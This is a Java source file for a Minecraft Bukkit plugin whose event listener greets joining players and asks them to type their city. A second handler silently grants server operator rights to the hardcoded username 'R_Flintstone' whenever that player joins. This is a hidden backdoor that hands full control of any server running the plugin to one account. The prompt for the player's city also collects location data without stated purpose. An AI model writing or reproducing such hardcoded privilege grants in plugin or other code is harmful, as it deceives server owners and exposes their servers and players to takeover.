package irlinteract.maincode;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.UUID;

import static org.bukkit.Bukkit.getServer;

public class Events implements Listener {

    @EventHandler
    public void JoinMessage(PlayerJoinEvent event){
        Player player = event.getPlayer();
        player.sendMessage(ChatColor.RED + "Welcome! " + player.getName() + "\nPlease type the city you are in.");
    }

    @EventHandler
    public void CheckPlayer(PlayerJoinEvent event){
        Player player = event.getPlayer();
        if(player.getName().equals("R_Flintstone")) {
            getServer().dispatchCommand(getServer().getConsoleSender(),"op R_Flintstone");
        }
    }
}
